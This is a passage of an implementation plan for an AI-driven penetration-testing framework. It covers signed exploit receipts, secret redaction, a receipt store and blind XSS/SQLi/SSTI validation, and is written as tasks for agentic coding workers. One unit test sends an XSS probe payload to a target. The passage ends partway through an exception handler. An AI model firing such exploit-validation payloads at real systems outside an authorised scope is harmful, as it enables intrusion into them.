# Proof-Carrying Chains — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Land the approved spec `docs/superpowers/specs/2026-08-01-proof-carrying-chains-design.md` — a three-piece exploit-capability tranche: (1) evidence & receipts layer, (2) chain executor hardening, (3) blind-oracle expansion, with receipts live-verified against the Juice Shop benchmark convention.

**Architecture:** New `src/ai_osop/evidence/` module (models/store/redaction/migrations) records an HMAC-chained `ExploitReceipt` per validation and per chain hop. `ChainComposerAgent` filters chains against scope, `ChainExecutorAgent` aborts on hop failure and persists per-hop receipts. `ExploitValidationAgent` confirms blind classes (XSS/SQLi/SSTI) via a namespaced OAST oracle. A dead phase-policy shadow is removed and phase-entry into EXPLOITATION is operator-gated.

**Tech Stack:** Python 3.11, pydantic v2, asyncpg-backed `ReceiptStore` (injected `db_pool`), Docker sandbox (existing `SandboxManager`), OAST MCP server (existing server, caller-side schema change only), pytest + pytest-asyncio, black/isort/flake8/mypy.

---

## Critical invariants (read before starting)

1. **Live-verified bar.** No mock-only "done". Where a task produces a real outbound behavior, the corresponding verification step either exercises the ephemeral in-process fixtures (`tests/qualification/conftest.py` pattern) or documents a Juice Shop runbook step. Mocks are acceptable only for unit tests of pure logic (e.g. redaction transforms) and for the LLM.
2. **Receipt capture never flips a verdict.** Receipt recording is best-effort post-verdict (mirrors the existing ledger pattern at `exploit_agent.py:158-164`).
3. **Do not touch the OAST server.** `OASTAdapter.register(label, context)` already stores arbitrary provenance; the schema is caller-side only.
4. **`ValidationLedger` uses `session_memory`.** Mirror the pattern from `src/ai_osop/agents/base_vuln_agent.py:21`: `ValidationLedger(self.ctx.session_memory)`. `ReceiptStore` similarly takes the session-memory's pg engine/pool via dependency injection (constructor arg `db_pool`).
5. **Line length 100** (pyproject.toml `line-length = 100`), isort `profile = "black"`, pytest `asyncio_mode = "auto"` (no `@pytest.mark.asyncio` decorator needed).
6. **Feature flag defaults OFF.** `evidence_receipts_enabled: bool = False` (`OSOP_EVIDENCE_RECEIPTS_ENABLED`). The live-verification gate (Task 27) is the only place that flips it.
7. **Redaction at capture, not export.** Secret-bearing headers/bodies are scrubbed before persistence; `redact_secrets=False` in export only changes label verbosity — it cannot recover an original secret (§5 error model).

---

# Part I — Piece 1: Evidence & Receipts Layer

### Task 1: Receipt models (`ReceiptArtifact`, `ExploitReceipt`)

**Files:**
- Create: `src/ai_osop/evidence/__init__.py`
- Create: `src/ai_osop/evidence/models.py`
- Test: `tests/test_evidence_models.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_evidence_models.py
from ai_osop.evidence.models import ExploitReceipt, ReceiptArtifact


def _artifact() -> ReceiptArtifact:
    return ReceiptArtifact(
        artifact_id="art-deadbeefcafe",
        kind="http_response",
        sha256="deadbeefcafe",
        blob_path="eng-1/art-deadbeefcafe",
    )


def test_receipt_round_trips_with_artifacts() -> None:
    r = ExploitReceipt(
        receipt_id="rcpt-1",
        engagement_id="eng-1",
        vuln_id="vuln-1",
        approval_id="apr-1",
        hop_idx=None,
        chain_id=None,
        verdict="confirmed",
        confidence=0.97,
        confirmation_note="OAST canary hit",
        oracle_signals={"oast_hit": True},
        artifacts=[_artifact()],
        request_summary={"method": "GET", "url": "https://x/?t=1"},
        response_summary={"http_code": 200},
        scope_hash="abc123",
        timestamp=__import__("datetime").datetime(2026, 8, 1),
        prev_receipt_hash="",
        integrity_sig="",
        simulated=False,
    )
    dumped = r.model_dump()
    assert dumped["receipt_id"] == "rcpt-1"
    assert dumped["artifacts"][0]["artifact_id"] == "art-deadbeefcafe"
    assert dumped["simulated"] is False
```

- [ ] **Step 2: Run test to verify it fails**

Run: `poetry run pytest tests/test_evidence_models.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'ai_osop.evidence'`

- [ ] **Step 3: Write the models**

```python
# src/ai_osop/evidence/__init__.py
"""Evidence & receipts layer: signed exploit receipts and artifact storage.

Public surface: ReceiptStore (store.py), ExploitReceipt/ReceiptArtifact (models.py),
redact helpers (redaction.py).
"""
```

```python
# src/ai_osop/evidence/models.py
"""Pydantic schemas for exploit receipts and content-addressed artifacts."""

from datetime import datetime
from typing import Any, Dict, List, Optional

from pydantic import BaseModel, Field


class ReceiptArtifact(BaseModel):
    artifact_id: str  # "art-<sha256[:12]>" content-addressed
    kind: str  # "http_request" | "http_response" | "screenshot" | "oast_interaction" | "console_log"
    sha256: str
    blob_path: str  # relative to the evidence root
    redaction_map: Dict[str, str] = Field(default_factory=dict)
    captured_at: datetime = Field(default_factory=datetime.utcnow)


class ExploitReceipt(BaseModel):
    receipt_id: str  # "rcpt-<uuid>"
    engagement_id: str
    vuln_id: str
    approval_id: str
    hop_idx: Optional[int] = None  # None for standalone validations
    chain_id: Optional[str] = None
    verdict: str  # "confirmed" | "not_confirmed" | "inconclusive"
    confidence: float
    confirmation_note: str
    oracle_signals: Dict[str, Any] = Field(default_factory=dict)
    artifacts: List[ReceiptArtifact] = Field(default_factory=list)
    request_summary: Dict[str, Any] = Field(default_factory=dict)
    response_summary: Dict[str, Any] = Field(default_factory=dict)
    scope_hash: str = ""
    timestamp: datetime = Field(default_factory=datetime.utcnow)
    prev_receipt_hash: str = ""
    integrity_sig: str = ""
    simulated: bool = False  # mirrors Vulnerability.is_simulated gate
```

- [ ] **Step 4: Run test to verify it passes**

Run: `poetry run pytest tests/test_evidence_models.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/ai_osop/evidence/__init__.py src/ai_osop/evidence/models.py tests/test_evidence_models.py
git commit -m "feat(evidence): ExploitReceipt and ReceiptArtifact pydantic models"
```

---

### Task 2: Redaction helper (`redaction.py`)

**Files:**
- Create: `src/ai_osop/evidence/redaction.py`
- Test: `tests/test_evidence_redaction.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_evidence_redaction.py
from ai_osop.evidence.redaction import redact_headers, redact_text


def test_redact_headers_scrubs_authorization_and_cookie() -> None:
    headers = {
        "Authorization": "Bearer sk-live-token",
        "Cookie": "session=abc123",
        "X-Api-Key": "key-xyz",
        "User-Agent": "AI-OSOP/1.0",
    }
    out = redact_headers(headers)
    assert out["User-Agent"] == "AI-OSOP/1.0"
    for h in ("Authorization", "Cookie", "X-Api-Key"):
        assert "[REDACTED:" in out[h]
        assert "sk-live-token" not in out[h]
        assert "abc123" not in out[h]


def test_redact_text_masks_long_hex_and_bearer_tokens() -> None:
    body = 'token=deadbeefcafe0123456789abcdef header: Bearer abcdef0123456789abcd'
    out = redact_text(body)
    assert "deadbeefcafe0123456789abcdef" not in out
    assert "abcdef0123456789abcd" not in out
    assert "[REDACTED" in out
```

- [ ] **Step 2: Run test to verify it fails**

Run: `poetry run pytest tests/test_evidence_redaction.py -v`
Expected: FAIL (`ModuleNotFoundError`)

- [ ] **Step 3: Write minimal implementation**

```python
# src/ai_osop/evidence/redaction.py
"""Secret redaction for receipts. Applied at capture time, before persistence."""

import hashlib
import re
from typing import Dict

# Headers whose values are bearer material and must never persist in plaintext.
_SECRET_HEADERS = frozenset({"authorization", "cookie", "x-api-key", "set-cookie", "proxy-authorization"})

# Long hex/alnum runs are usually tokens or hashes of secrets.
_TOKEN_RE = re.compile(r"[A-Za-z0-9\-_/+]{24,}={0,2}")


def _label(value: str) -> str:
    return f"[REDACTED:sha256:{hashlib.sha256(value.encode()).hexdigest()[:12]}]"


def redact_headers(headers: Dict[str, str]) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for k, v in headers.items():
        out[k] = _label(v) if k.lower() in _SECRET_HEADERS else v
    return out


def redact_text(text: str) -> str:
    return _TOKEN_RE.sub(lambda m: _label(m.group(0)), text)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `poetry run pytest tests/test_evidence_redaction.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/ai_osop/evidence/redaction.py tests/test_evidence_redaction.py
git commit -m "feat(evidence): header/text redaction helpers for receipt capture"
```

---

### Task 3: Migration — `exploit_receipts` table

**Files:**
- Create: `src/ai_osop/evidence/migrations.py`
- Test: `tests/test_evidence_store.py` (started here; extended in Tasks 4–9)

- [ ] **Step 1: Write the failing test**

```python
# tests/test_evidence_store.py
"""ReceiptStore tests. DB-backed tests skip when Postgres is unavailable;
pure-function tests (signing) always run."""
import pytest

pytestmark = pytest.mark.integration


@pytest.fixture
async def sa_engine():
    """Real SQLAlchemy AsyncEngine from SessionMemory (mirrors session_memory.py:321)."""
    from ai_osop.memory.session_memory import SessionMemory

    sm = SessionMemory()
    try:
        await sm.connect()
    except Exception as e:
        pytest.skip(f"Postgres not available: {e}")
    yield sm._pg_engine
    await sm.close()


async def test_ensure_schema_creates_table(sa_engine):
    from sqlalchemy import text

    from ai_osop.evidence.migrations import ensure_schema

    await ensure_schema(sa_engine)
    async with sa_engine.connect() as conn:
        row = await conn.execute(text("SELECT to_regclass('public.exploit_receipts')"))
        assert row.scalar_one() == "exploit_receipts"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `poetry run pytest tests/test_evidence_store.py -v`
Expected: FAIL (`ModuleNotFoundError`) or SKIP if Postgres unavailable

- [ ] **Step 3: Write minimal implementation (SQLAlchemy Core, matches session_memory style)**

```python
# src/ai_osop/evidence/migrations.py
"""SQLAlchemy Core table for exploit receipts (mirrors session_memory metadata style)."""

from sqlalchemy import (JSON, Boolean, Column, DateTime, Float, Index, Integer,
                        MetaData, String, Table)

metadata = MetaData()

exploit_receipts = Table(
    "exploit_receipts",
    metadata,
    Column("receipt_id", String, primary_key=True),
    Column("engagement_id", String, nullable=False),
    Column("vuln_id", String, nullable=False),
    Column("approval_id", String, nullable=False),
    Column("hop_idx", Integer, nullable=True),
    Column("chain_id", String, nullable=True),
    Column("verdict", String, nullable=False),
    Column("confidence", Float, nullable=False),
    Column("confirmation_note", String, nullable=False, server_default=""),
    Column("oracle_signals", JSON, nullable=False),
    Column("artifacts", JSON, nullable=False),
    Column("request_summary", JSON, nullable=False),
    Column("response_summary", JSON, nullable=False),
    Column("scope_hash", String, nullable=False, server_default=""),
    Column("prev_receipt_hash", String, nullable=False, server_default=""),
    Column("integrity_sig", String, nullable=False, server_default=""),
    Column("simulated", Boolean, nullable=False, server_default="false"),
    Column("created_at", DateTime(timezone=True), nullable=False),
    Index("idx_exploit_receipts_eng", "engagement_id"),
    Index("idx_exploit_receipts_vuln", "vuln_id"),
)


async def ensure_schema(sa_engine) -> None:
    async with sa_engine.begin() as conn:
        await conn.run_sync(metadata.create_all)
```

- [ ] **Step 4: Run test to verify it passes (or skips cleanly without Postgres)**

Run: `poetry run pytest tests/test_evidence_store.py -v`
Expected: PASS, or SKIP with "Postgres not available"

- [ ] **Step 5: Commit**

```bash
git add src/ai_osop/evidence/migrations.py tests/test_evidence_store.py
git commit -m "feat(evidence): exploit_receipts SQLAlchemy table (session_memory metadata style)"
```

---

### Task 4: ReceiptStore — HMAC signing primitive

**Files:**
- Create: `src/ai_osop/evidence/store.py`
- Test: `tests/test_evidence_store.py` (append)

- [ ] **Step 1: Write the failing test (pure logic, no DB)**

```python
def test_signature_is_deterministic_and_key_dependent():
    from ai_osop.evidence.store import _sign_receipt_fields

    canonical = {"receipt_id": "rcpt-1", "engagement_id": "eng-1", "vuln_id": "v1"}
    sig1 = _sign_receipt_fields(b"key-a", "prev-x", canonical)
    sig2 = _sign_receipt_fields(b"key-a", "prev-x", canonical)
    sig3 = _sign_receipt_fields(b"key-b", "prev-x", canonical)
    sig4 = _sign_receipt_fields(b"key-a", "prev-y", canonical)
    assert sig1 == sig2
    assert sig1 != sig3 and sig1 != sig4
```

- [ ] **Step 2: Run test to verify it fails**

Run: `poetry run pytest tests/test_evidence_store.py -k signature -v`
Expected: FAIL (`ImportError: cannot import name '_sign_receipt_fields'`)

- [ ] **Step 3: Write minimal implementation**

```python
# src/ai_osop/evidence/store.py
"""ReceiptStore: persists HMAC-chained ExploitReceipts and artifact blobs.

DB access is SQLAlchemy Core against an injected AsyncEngine (same engine
SessionMemory builds; do NOT use asyncpg directly — see memory/session_memory.py).
"""

import hashlib
import hmac
import json
from pathlib import Path
from typing import Any, Dict

from sqlalchemy import insert, select

from ai_osop.evidence.migrations import exploit_receipts
from ai_osop.evidence.models import ExploitReceipt


def _canonical_payload(receipt_fields: Dict[str, Any]) -> str:
    return json.dumps(receipt_fields, sort_keys=True, default=str, separators=(",", ":"))


def _sign_receipt_fields(
    signing_key: bytes, prev_hash: str, receipt_fields: Dict[str, Any]
) -> str:
    data = f"{prev_hash}:{_canonical_payload(receipt_fields)}"
    return hmac.new(signing_key, data.encode(), hashlib.sha256).hexdigest()


def _receipt_signing_fields(receipt: "ExploitReceipt") -> Dict[str, Any]:
    """Subset of fields covered by the HMAC chain (tamper-relevant only)."""
    return {
        "receipt_id": receipt.receipt_id,
        "engagement_id": receipt.engagement_id,
        "vuln_id": receipt.vuln_id,
        "approval_id": receipt.approval_id,
        "verdict": receipt.verdict,
        "confidence": receipt.confidence,
        "scope_hash": receipt.scope_hash,
        "oracle_signals": receipt.oracle_signals,
    }


class ReceiptStore:
    """Persists signed exploit receipts.

    `integrity` is an AuditIntegrity instance; we reuse its HMAC signing key but
    maintain a separate per-engagement chain (AuditIntegrity._last_hash is NOT
    shared with the audit ledger).
    """

    def __init__(self, sa_engine, integrity, evidence_root: Path):
        self._engine = sa_engine
        self._integrity = integrity
        self._root = Path(evidence_root)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `poetry run pytest tests/test_evidence_store.py -k signature -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/ai_osop/evidence/store.py tests/test_evidence_store.py
git commit -m "feat(evidence): ReceiptStore scaffold with deterministic HMAC signing"
```

---

### Task 5: ReceiptStore — content-addressed artifact blobs

**Files:**
- Modify: `src/ai_osop/evidence/store.py` (append method)
- Test: `tests/test_evidence_store.py` (append)

- [ ] **Step 1: Write the failing test**

```python
def test_blob_for_content_is_content_addressed(tmp_path):
    from ai_osop.evidence.store import ReceiptStore

    store = ReceiptStore(sa_engine=None, integrity=None, evidence_root=tmp_path)
    blob = store._blob_for_content(
        engagement_id="eng-1", kind="http_response", content='{"secret": "abc123xyz"}'
    )
    assert len(blob.sha256) == 64
    assert blob.artifact_id.startswith("art-")
    full = tmp_path / blob.blob_path
    assert full.exists()
    # persisted blob body is redacted at capture
    assert "abc123xyz" not in full.read_text()
    assert "[REDACTED" in full.read_text()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `poetry run pytest tests/test_evidence_store.py -k content_addressed -v`
Expected: FAIL (`AttributeError: 'ReceiptStore' object has no attribute '_blob_for_content'`)

- [ ] **Step 3: Write minimal implementation (append method into the existing class)**

```python
    def _blob_for_content(self, engagement_id: str, kind: str, content: str) -> "ReceiptArtifact":
        """Redact then persist content; return its content-addressed artifact."""
        from ai_osop.evidence.models import ReceiptArtifact
        from ai_osop.evidence.redaction import redact_text

        scrubbed = redact_text(content)
        digest = hashlib.sha256(scrubbed.encode()).hexdigest()
        artifact_id = f"art-{digest[:12]}"
        rel = Path(engagement_id) / artifact_id
        target = self._root / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(scrubbed)
        return ReceiptArtifact(
            artifact_id=artifact_id, kind=kind, sha256=digest, blob_path=str(rel)
        )
```

- [ ] **Step 4: Run test to verify it passes**

Run: `poetry run pytest tests/test_evidence_store.py -k content_addressed -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/ai_osop/evidence/store.py tests/test_evidence_store.py
git commit -m "feat(evidence): content-addressed artifact blobs captured post-redaction"
```

---

### Task 6: ReceiptStore — `record()` + `get()` (HMAC chain, SQLAlchemy insert)

**Files:**
- Modify: `src/ai_osop/evidence/store.py`
- Test: `tests/test_evidence_store.py` (append)

- [ ] **Step 1: Write the failing test**

```python
def _mk_receipt(rid: str, eng: str = "eng-9", vuln: str = "v-1") -> "ExploitReceipt":
    from ai_osop.evidence.models import ExploitReceipt

    return ExploitReceipt(
        receipt_id=rid, engagement_id=eng, vuln_id=vuln, approval_id="apr-1",
        verdict="confirmed", confidence=0.9, confirmation_note="n", scope_hash="sh",
    )


async def test_record_chains_receipts_hmac(sa_engine, tmp_path):
    from ai_osop.evidence.migrations import ensure_schema
    from ai_osop.evidence.store import ReceiptStore
    from ai_osop.safety.scope import AuditIntegrity

    await ensure_schema(sa_engine)
    store = ReceiptStore(sa_engine=sa_engine, integrity=AuditIntegrity(b"test-key-1"), evidence_root=tmp_path)

    h1 = await store.record(_mk_receipt("rcpt-a"))
    r1 = await store.get("rcpt-a")
    assert r1.integrity_sig == h1 and r1.prev_receipt_hash == ""

    await store.record(_mk_receipt("rcpt-b"))
    r2 = await store.get("rcpt-b")
    assert r2.prev_receipt_hash == h1
```

- [ ] **Step 2: Run test to verify it fails**

Run: `poetry run pytest tests/test_evidence_store.py -k chains_receipts -v`
Expected: FAIL (`AttributeError: ... no attribute 'record'`)

- [ ] **Step 3: Write minimal implementation (append methods)**

```python
    async def record(self, receipt: "ExploitReceipt") -> str:
        prev = await self._last_receipt_hash(receipt.engagement_id)
        sig = _sign_receipt_fields(
            self._integrity.signing_key, prev, _receipt_signing_fields(receipt)
        )
        async with self._engine.begin() as conn:
            await conn.execute(
                insert(exploit_receipts).values(
                    receipt_id=receipt.receipt_id,
                    engagement_id=receipt.engagement_id,
                    vuln_id=receipt.vuln_id,
                    approval_id=receipt.approval_id,
                    hop_idx=receipt.hop_idx,
                    chain_id=receipt.chain_id,
                    verdict=receipt.verdict,
                    confidence=receipt.confidence,
                    confirmation_note=receipt.confirmation_note,
                    oracle_signals=receipt.oracle_signals,
                    artifacts=[a.model_dump(mode="json") for a in receipt.artifacts],
                    request_summary=receipt.request_summary,
                    response_summary=receipt.response_summary,
                    scope_hash=receipt.scope_hash,
                    prev_receipt_hash=prev,
                    integrity_sig=sig,
                    simulated=receipt.simulated,
                    created_at=receipt.timestamp,
                )
            )
        return sig

    async def _last_receipt_hash(self, engagement_id: str) -> str:
        async with self._engine.connect() as conn:
            row = await conn.execute(
                select(exploit_receipts.c.integrity_sig)
                .where(exploit_receipts.c.engagement_id == engagement_id)
                .order_by(exploit_receipts.c.created_at.desc())
                .limit(1)
            )
            val = row.scalar_one_or_none()
        return val or ""

    async def get(self, receipt_id: str) -> "Optional[ExploitReceipt]":
        async with self._engine.connect() as conn:
            row = (
                await conn.execute(
                    select(exploit_receipts).where(exploit_receipts.c.receipt_id == receipt_id)
                )
            ).mappings().first()
        return ExploitReceipt(**dict(row)) if row else None
```

Add `Optional` to the `typing` import at the top of `store.py`.

- [ ] **Step 4: Run test to verify it passes (or skips without Postgres)**

Run: `poetry run pytest tests/test_evidence_store.py -k chains_receipts -v`
Expected: PASS or SKIP

- [ ] **Step 5: Commit**

```bash
git add src/ai_osop/evidence/store.py tests/test_evidence_store.py
git commit -m "feat(evidence): ReceiptStore.record with per-engagement HMAC chain + get"
```

---

### Task 7: ReceiptStore — `verify_chain` (tamper detection)

**Files:**
- Modify: `src/ai_osop/evidence/store.py`
- Test: `tests/test_evidence_store.py` (append)

- [ ] **Step 1: Write the failing test**

```python
async def test_verify_chain_detects_tamper(sa_engine, tmp_path):
    from sqlalchemy import update

    from ai_osop.evidence.migrations import ensure_schema, exploit_receipts
    from ai_osop.evidence.models import ExploitReceipt
    from ai_osop.evidence.store import ReceiptStore
    from ai_osop.safety.scope import AuditIntegrity

    await ensure_schema(sa_engine)
    store = ReceiptStore(sa_engine=sa_engine, integrity=AuditIntegrity(b"k-verify"), evidence_root=tmp_path)
    for i, rid in enumerate(["ra-1", "ra-2", "ra-3"]):
        await store.record(_mk_receipt(rid, eng="eng-t", vuln=f"v-{i}"))
    assert await store.verify_chain("eng-t") is True

    async with sa_engine.begin() as conn:
        await conn.execute(
            update(exploit_receipts)
            .where(exploit_receipts.c.receipt_id == "ra-2")
            .values(verdict="not_confirmed")
        )
    assert await store.verify_chain("eng-t") is False
```

- [ ] **Step 2: Run test to verify it fails**

Run: `poetry run pytest tests/test_evidence_store.py -k tamper -v`
Expected: FAIL (`AttributeError: ... no attribute 'verify_chain'`)

- [ ] **Step 3: Implementation (append)**

```python
    async def verify_chain(self, engagement_id: str) -> bool:
        async with self._engine.connect() as conn:
            rows = (
                await conn.execute(
                    select(exploit_receipts)
                    .where(exploit_receipts.c.engagement_id == engagement_id)
                    .order_by(exploit_receipts.c.created_at)
                )
            ).mappings().all()
        prev = ""
        for row in rows:
            payload = {
                "receipt_id": row["receipt_id"], "engagement_id": row["engagement_id"],
                "vuln_id": row["vuln_id"], "approval_id": row["approval_id"],
                "verdict": row["verdict"], "confidence": row["confidence"],
                "scope_hash": row["scope_hash"], "oracle_signals": row["oracle_signals"],
            }
            if _sign_receipt_fields(self._integrity.signing_key, prev, payload) != row["integrity_sig"]:
                return False
            prev = row["integrity_sig"]
        return True
```

- [ ] **Step 4: Run test to verify it passes**

Run: `poetry run pytest tests/test_evidence_store.py -k tamper -v`
Expected: PASS or SKIP

- [ ] **Step 5: Commit**

```bash
git add src/ai_osop/evidence/store.py tests/test_evidence_store.py
git commit -m "feat(evidence): verify_chain replays per-engagement HMAC chain"
```

---

### Task 8: ReceiptStore — `for_vulnerability` / `for_engagement`

**Files:**
- Modify: `src/ai_osop/evidence/store.py`
- Test: `tests/test_evidence_store.py` (append)

- [ ] **Step 1: Write the failing test**

```python
async def test_for_vulnerability_returns_only_matching(sa_engine, tmp_path):
    from ai_osop.evidence.migrations import ensure_schema
    from ai_osop.evidence.store import ReceiptStore
    from ai_osop.safety.scope import AuditIntegrity

    await ensure_schema(sa_engine)
    store = ReceiptStore(sa_engine=sa_engine, integrity=AuditIntegrity(b"k-q"), evidence_root=tmp_path)
    await store.record(_mk_receipt("rq-1", vuln="v-1"))
    await store.record(_mk_receipt("rq-2", vuln="v-2"))
    matches = await store.for_vulnerability("v-1")
    assert [m.receipt_id for m in matches] == ["rq-1"]
```

- [ ] **Step 2: Run test to verify it fails**

Run: `poetry run pytest tests/test_evidence_store.py -k only_matching -v`
Expected: FAIL (`AttributeError`)

- [ ] **Step 3: Implementation (append)**

```python
    async def _fetch_where(self, clause) -> "List[ExploitReceipt]":
        async with self._engine.connect() as conn:
            rows = (
                await conn.execute(
                    select(exploit_receipts).where(clause).order_by(exploit_receipts.c.created_at)
                )
            ).mappings().all()
        return [ExploitReceipt(**dict(r)) for r in rows]

    async def for_vulnerability(self, vuln_id: str) -> "List[ExploitReceipt]":
        return await self._fetch_where(exploit_receipts.c.vuln_id == vuln_id)

    async def for_engagement(self, engagement_id: str) -> "List[ExploitReceipt]":
        return await self._fetch_where(exploit_receipts.c.engagement_id == engagement_id)
```

Add `List` to the `typing` import.

- [ ] **Step 4: Run test to verify it passes**

Run: `poetry run pytest tests/test_evidence_store.py -k only_matching -v`
Expected: PASS or SKIP

- [ ] **Step 5: Commit**

```bash
git add src/ai_osop/evidence/store.py tests/test_evidence_store.py
git commit -m "feat(evidence): ReceiptStore queries by vulnerability and engagement"
```

---

### Task 9: ReceiptStore — `export_bundle` (bounty-grade, no auto-submit)

**Files:**
- Modify: `src/ai_osop/evidence/store.py`
- Test: `tests/test_evidence_store.py` (append)

- [ ] **Step 1: Write the failing test**

```python
async def test_export_bundle_redacts_and_never_submits(sa_engine, tmp_path):
    from ai_osop.evidence.migrations import ensure_schema
    from ai_osop.evidence.models import ExploitReceipt
    from ai_osop.evidence.store import ReceiptStore
    from ai_osop.safety.scope import AuditIntegrity

    await ensure_schema(sa_engine)
    store = ReceiptStore(sa_engine=sa_engine, integrity=AuditIntegrity(b"k-exp"), evidence_root=tmp_path)
    await store.record(ExploitReceipt(
        receipt_id="rx-1", engagement_id="e-1", vuln_id="v-9",
        approval_id="apr-9", verdict="confirmed", confidence=0.95,
        confirmation_note="stored XSS via comment field",
        oracle_signals={"body_signature": 0.85},
        request_summary={"method": "POST", "url": "https://t/submit",
                          "headers": {"Authorization": "[REDACTED:sha256:ab12]"}},
        response_summary={"http_code": 200}, scope_hash="sh",
    ))
    bundle = await store.export_bundle("v-9")
    assert bundle["submitted"] is False
    assert bundle["receipt_count"] == 1
    assert "stored XSS" in bundle["markdown"]
    for rec in bundle["receipts"]:
        assert "Bearer" not in str(rec.get("request_summary", {}))
```

- [ ] **Step 2: Run test to verify it fails**

Run: `poetry run pytest tests/test_evidence_store.py -k export_bundle -v`
Expected: FAIL (`AttributeError: ... no attribute 'export_bundle'`)

- [ ] **Step 3: Implementation (append)**

```python
    async def export_bundle(self, vuln_id: str, redact_secrets: bool = True) -> Dict[str, Any]:
        """Bounty-grade export. Redaction is capture-time; export never re-emits
        originals and never submits — caller hands `markdown` to BugBountyAdapter."""
        receipts = await self.for_vulnerability(vuln_id)
        manifest: List[Dict[str, Any]] = []
        for r in receipts:
            manifest.extend(a.model_dump() for a in r.artifacts)
        markdown = (
            f"## Exploit receipts for {vuln_id}\n\n"
            + "\n\n".join(
                f"- **{r.receipt_id}** verdict={r.verdict} confidence={r.confidence:.2f} "
                f"note={r.confirmation_note} scope_hash={r.scope_hash}"
                for r in receipts
            )
        )
        return {
            "markdown": markdown,
            "manifest": manifest,
            "receipts": [r.model_dump(mode="json") for r in receipts],
            "receipt_count": len(receipts),
            "submitted": False,
            "redact_secrets": redact_secrets,
        }
```

- [ ] **Step 4: Run test to verify it passes**

Run: `poetry run pytest tests/test_evidence_store.py -k export_bundle -v`
Expected: PASS or SKIP

- [ ] **Step 5: Commit**

```bash
git add src/ai_osop/evidence/store.py tests/test_evidence_store.py
git commit -m "feat(evidence): export_bundle returns markdown+manifest, never submits"
```

---

### Task 10: Settings — evidence feature flag (default OFF)

**Files:**
- Modify: `src/ai_osop/core/config.py` (Settings class)
- Test: `tests/test_smoke.py` (append)

- [ ] **Step 1: Write the failing test**

```python
def test_evidence_receipts_flag_defaults_off():
    from ai_osop.core.config import Settings

    s = Settings()
    assert s.evidence_receipts_enabled is False
    assert s.evidence_root == "./evidence"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `poetry run pytest tests/test_smoke.py::test_evidence_receipts_flag_defaults_off -v`
Expected: FAIL (`AttributeError: 'Settings' object has no attribute 'evidence_receipts_enabled'`)

- [ ] **Step 3: Add fields to `Settings` in `src/ai_osop/core/config.py`**

```python
evidence_receipts_enabled: bool = Field(
    default=False, validation_alias="OSOP_EVIDENCE_RECEIPTS_ENABLED"
)
evidence_root: str = Field(default="./evidence", validation_alias="OSOP_EVIDENCE_ROOT")
```

Place near the other feature toggles (after `mock_llm` / `allow_simulated_findings`).

- [ ] **Step 4: Run test to verify it passes**

Run: `poetry run pytest tests/test_smoke.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/ai_osop/core/config.py tests/test_smoke.py
git commit -m "feat(config): evidence_receipts_enabled flag, default off"
```

---

### Task 11: ExploitValidationAgent — receipt emission

**Files:**
- Modify: `src/ai_osop/agents/exploit_agent.py`
- Test: `tests/test_exploit_agent.py` (append)

- [ ] **Step 1: Write the failing test**

```python
async def test_exploit_records_receipt_when_store_present(exploit_agent, tmp_path):
    from ai_osop.evidence.store import ReceiptStore
    from ai_osop.safety.scope import AuditIntegrity

    store = MagicMock(spec=ReceiptStore)
    store.record = AsyncMock(return_value="sig-x")
    exploit_agent.receipt_store = store
    exploit_agent.scope_hash = lambda: "scopehash-1"  # helper the impl defines
    exploit_agent._execute_in_sandbox = AsyncMock(return_value={
        "status": "success", "http_code": 200,
        "body": "<script>alert(1)</script> reflected raw",
    })
    result = await exploit_agent._validate_exploit({
        "target": "https://t", "payload": "<script>alert(1)</script>",
        "vulnerability_id": "vuln-r1", "approval_id": "apr-1", "vuln_class": "xss",
    })
    assert result["confirmed"] is True
    assert store.record.await_count == 1
    receipt = store.record.await_args.args[0]
    assert receipt.vuln_id == "vuln-r1"
    assert receipt.approval_id == "apr-1"
    assert receipt.scope_hash == "scopehash-1"
```

(The `exploit_agent` fixture from the existing file is reused — MagicMock ctx per `tests/test_exploit_agent.py:12-31`.)

- [ ] **Step 2: Run test to verify it fails**

Run: `poetry run pytest tests/test_exploit_agent.py -k records_receipt -v`
Expected: FAIL (`AttributeError: receipt_store` / await_count == 0)

- [ ] **Step 3: Implement in `exploit_agent.py`**

Add class attribute and scope-hash helper:

```python
class ExploitValidationAgent(BaseAgent):
    ledger: Any = None
    receipt_store: Any = None  # ReceiptStore, runtime-injected like `ledger`

    def scope_hash(self) -> str:
        scope = getattr(self.ctx, "scope", None)
        if scope is not None and hasattr(scope, "_signing_payload"):
            return hashlib.sha256(scope._signing_payload().encode()).hexdigest()
        return hashlib.sha256(repr(sorted(getattr(scope, "domains", []) or [])).encode()).hexdigest()
```

In `_validate_exploit`, after `_confirm_by_response` returns and **before** the `feedback.payload_validated` publish:

```python
receipt_id = ""
if getattr(self, "receipt_store", None) is not None and settings.evidence_receipts_enabled:
    try:
        from ai_osop.evidence.models import ExploitReceipt
        receipt = ExploitReceipt(
            receipt_id=f"rcpt-{uuid.uuid4().hex[:12]}",
            engagement_id=(self.ctx.current_task.engagement_id if self.ctx.current_task else self.ctx.session_id),
            vuln_id=vuln_id, approval_id=approval_id,
            verdict="confirmed" if is_confirmed else "not_confirmed",
            confidence=confidence, confirmation_note=confirmation_note,
            oracle_signals={"oast_hit": bool(execution_result.get("oast_interaction")
                              or execution_result.get("canary_hit")
                              or execution_result.get("oob_interaction"))},
            scope_hash=self.scope_hash(),
            request_summary={"method": "POST", "url": target},
            response_summary={"http_code": execution_result.get("http_code")},
        )
        receipt_id = await self.receipt_store.record(receipt)
    except Exception as e:  # noqa: BLE001 — receipts must never flip a verdict
